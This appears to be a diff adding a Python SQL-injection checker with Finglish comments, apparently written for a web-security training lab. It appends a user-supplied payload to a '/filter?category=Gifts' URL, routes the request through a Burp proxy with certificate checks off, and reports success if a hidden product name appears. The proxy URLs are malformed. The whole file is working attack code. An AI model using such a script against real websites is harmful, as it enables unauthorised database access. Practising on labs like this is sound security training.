@@ -1,0 +1,42 @@
+# ketab khane baraye ferestadan http request.
+import requests 
+# az in ketab khane baraye gerftane argument dara zaman ejraye script estefade shode.
+import sys
+# in ketabkhane urlib3 baraye kar kardan ba safahate web estefade mishavad.
+import urllib3
+# in method error http Error hara baz nemigardanad.
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+# ersal traffic be samte burp suite. 
+proxies = {"http":"http:\\127.0.0.1:8080","https":"https:\\127.0.0.1:8088"} 
+# in function asli barname baraye sql injection ast.
+def sql_injection_exploit(url, payload):
+    # in motheghayer ghesmate entehaie url ast ke masir asib pazir ra moshakhas mikonad
+    uri = "/filter?category=Gifts"
+    # in moteghayer htpp request ast
+    # az http verb get (+uri +url+ payload) estefade shode va ba False kardan attribute verify certificate verification ra ghere faal mikonim va ba attribute proxies , moteghayer proxy ra dakhet get request gharar midahim
+    req= requests.get(url + uri + payload, verify=False, proxies=proxies) 
+    # agar yek meghdar gheyre mortabet be yek daste bandi bad az injam sql injection namyesh dade shod moshkhas mishavad ke url asib pazir ast.
+    if "BBQ Suitcase" in req.text: #req.text response http get request ast
+        return True
+    else:
+        return False
+# agare script ba input ejara shod motagher haye url va payload ra az karbar begir dara gher in sorat bro be exception.    
+if __name__ == "__main__":
+    try:
+        # argument aval url 
+        url = sys.argv[1].strip() 
+        # argument dovoum payload
+        payload = sys.argv[2].strip() 
+    except IndexError:
+        # darsaorat farakhani khode script dar mohit command line mavared zir ra namayesh bede.
+        # url va payload
+        print("[-] Usage: %s <url><payload>"% sys.argv[0])
+        # style argument haye url va payload bayad be sorate zir bashad.
+        print("[-] example: %s www.example.com '1=1'" % sys.argv[0]) # tozih marbot be nahveie vared kardam url va payload
+        # kharej shodan az barname.
+        sys.exit() 
+    # agar function sql_injection_exploit(url,payload) True boud agare False boud.
+    if sql_injection_exploit(url,payload):
+        print("[+] Sql Injection Successful")
+    else:
+        print("[-] Sql Injection Unsuccessful")
